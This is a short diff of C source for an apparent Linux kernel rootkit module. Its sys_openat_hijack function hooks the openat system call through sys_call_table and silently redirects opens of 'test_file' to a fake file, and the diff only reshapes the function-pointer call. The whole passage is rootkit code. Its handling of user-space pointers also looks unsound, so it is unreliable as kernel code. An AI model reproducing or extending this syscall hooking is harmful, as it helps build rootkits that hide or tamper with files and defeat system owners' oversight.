@@ -66,18 +66,18 @@ static void unhook_all(void)
 
 asmlinkage int sys_openat_hijack(int dirfd, const char __user *pathname, int flags) 
 { 
-    int (*orig)(int, const char __user *, int) = 
-        (int (*)(int, const char __user *, int))(sys_call_table[__NR_openat]);
+    asmlinkage int (*orig)(int, const char __user *, int);
+    orig = (asmlinkage int (*)(int, const char __user *, int))(sys_call_table[__NR_openat]);
 
     const char * orig_file = "test_file";
     const char * fake_file = "./test_file_fake";
 
     if (strstr(pathname, orig_file))
     {
-        return (*orig)(dirfd, fake_file, flags);
+        return orig(dirfd, fake_file, flags);
     }    
  
-    return (*orig)(dirfd, pathname, flags);
+    return orig(dirfd, pathname, flags);
 }
 
 static int __init init_rootkit(void)
